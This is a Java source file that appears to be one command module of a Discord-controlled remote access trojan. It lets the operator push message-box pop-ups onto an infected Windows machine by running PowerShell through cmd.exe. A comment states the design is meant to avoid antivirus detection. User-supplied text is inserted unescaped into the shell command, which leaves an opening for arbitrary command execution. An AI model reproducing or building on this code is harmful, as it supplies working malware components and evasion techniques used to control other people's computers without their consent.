package ml.hashy.rat.commands;

import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;

import java.io.IOException;
import java.util.Objects;

public class MessageBox extends ListenerAdapter {

    @Override
    public void onSlashCommandInteraction(SlashCommandInteractionEvent event) {
        if (!event.getName().equals("messagebox"))
            return;

        TextInput title = TextInput.create("title", "Title", TextInputStyle.SHORT).build();
        TextInput message = TextInput.create("msg", "Message", TextInputStyle.PARAGRAPH).build();

        Modal modal = Modal.create("msgBox", "Message Box")
                .addActionRows(ActionRow.of(title), ActionRow.of(message)).build();

        event.replyModal(modal).queue();
    }

    @Override
    public void onModalInteraction(ModalInteractionEvent event) {
        if (!event.getModalId().equals("msgBox"))
            return;

        /*
        Not using Swing and using independent process so there is no correlation between the app
        making it less likely to be flagged by antiviruses
         */

        String title = Objects.requireNonNull(event.getInteraction().getValue("title")).getAsString();
        String msg = Objects.requireNonNull(event.getInteraction().getValue("msg")).getAsString();

        try {
            Runtime.getRuntime().exec(String.format
                    ("cmd.exe /c start powershell -Command \"& {Add-Type -AssemblyName System.Windows.Forms; " +
                            "[System.Windows.Forms.MessageBox]::Show('%s', '%s', 'OK', " +
                            "[System.Windows.Forms.MessageBoxIcon]::Information);}\"", msg, title));
            event.reply("Succeeded in sending the form to the user!").setEphemeral(true).queue();
        } catch (IOException ignored) {
            event.reply("An error occurred when trying to execute the command!").setEphemeral(true).queue();
        }
    }
}
